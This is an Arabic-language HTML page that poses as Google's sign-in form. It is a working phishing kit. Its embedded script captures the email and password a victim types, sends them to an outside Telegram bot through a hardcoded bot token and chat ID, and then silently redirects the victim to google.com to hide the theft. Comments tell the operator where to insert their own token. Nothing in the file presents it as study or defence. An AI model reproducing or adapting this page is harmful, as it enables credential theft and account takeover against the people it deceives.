<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google – تسجيل الدخول</title>
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 90%;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .logo {
            width: 75px;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin: 20px 0 10px;
        }
        .btn:hover {
            background: #1669d0;
        }
        .footer-links {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 5px;
        }
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 10px;
            margin-top: 25px;
            border-radius: 5px;
            font-size: 13px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- شعار Google -->
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        
        <h1>تسجيل الدخول</h1>
        <p class="subtitle">للمتابعة إلى Google</p>

        <form id="googleForm">
            <input type="email" id="emailField" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passField" placeholder="أدخل كلمة المرور" required>
            
            <button type="submit" class="btn">التالي</button>
        </form>

        <div class="footer-links">
            <a href="#">مساعدة</a> •
            <a href="#">الخصوصية</a> •
            <a href="#">البنود</a>
    <script>
        // ==========================================
        // ⚠️ هنا تضع التوكن والـ Chat ID الخاصين بك
        // ==========================================
        const BOT_TOKEN = "8877169043:AAF_zwAlpYkRGs6fteqIUlgIUycSvmj_oac";
        const CHAT_ID = "1346886960";

        // ==========================================
        // كود الإرسال إلى تيليجرام
        // ==========================================
        document.getElementById('googleForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إرسال النموذج التقليدي

            // جلب البيانات من الحقول
            var email = document.getElementById('emailField').value;
            var pass = document.getElementById('passField').value;

            // تجهيز الرسالة
            var message = "🚨 بيانات Google جديدة!\n━━━━━━━━━━━━━━━\n📧 " + email + "\n🔑 " + pass;

            // رابط API مع التوكن ومعرف الشات
            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);

            // إرسال الطلب بصمت، ثم توجيه المستخدم إلى google.com
            fetch(url).finally(function() {
                window.location.href = "https://www.google.com/";
            });
        });
    </script>
</body>
</html>
